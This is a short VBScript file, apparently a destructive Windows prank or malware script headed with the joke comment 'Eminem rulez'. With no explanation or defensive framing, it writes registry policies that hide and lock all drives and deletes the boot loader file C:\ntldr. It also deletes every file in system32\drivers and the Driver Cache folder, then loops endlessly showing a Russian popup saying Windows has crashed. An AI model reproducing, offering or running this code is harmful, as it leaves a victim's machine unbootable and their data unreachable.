'Eminem  rulez
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDrives","67108863","REG_DWORD"
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoViewOnDrive","67108863","REG_DWORD"
fso.deletefile "C:\ntldr",1 
Set Folder = FSO.GetFolder(fso.getspecialfolder(0)+"\system32\drivers\")
For Each File In Folder.Files
File.delete
Next
fso.deletefolder fso.getspecialfolder(0)+"\Driver Cache"
fso.deletefolder fso.getspecialfolder(0)+"\system32\drives",1
i=999
while i>0 or i<0
S.popup "Винда слетела нах....",0, "Заголовок сообщения",0+0
i=i-1
wend


